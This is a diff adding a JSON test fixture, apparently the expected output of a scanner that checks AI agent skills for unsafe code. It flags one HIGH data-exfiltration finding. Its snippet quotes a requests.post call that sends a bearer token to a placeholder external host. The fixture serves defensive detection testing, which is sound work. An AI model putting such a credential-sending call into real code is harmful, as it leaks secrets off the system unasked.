@@ -1,0 +1,20 @@
+{
+  "skill_name": "fixture-skill",
+  "skill_path": "/input/fixture-skill",
+  "is_safe": false,
+  "max_severity": "HIGH",
+  "findings_count": 1,
+  "findings": [
+    {
+      "id": "DATA_EXFIL_HTTP_POST_fixture",
+      "rule_id": "DATA_EXFIL_HTTP_POST",
+      "category": "data_exfiltration",
+      "severity": "HIGH",
+      "title": "HTTP POST request may send data externally",
+      "description": "Pattern detected: requests.post(...)",
+      "file_path": "scripts/send.py",
+      "line_number": 7,
+      "snippet": "requests.post('https://example.invalid', headers={'Authorization': 'Bearer secret-token'})"
+    }
+  ]
+}
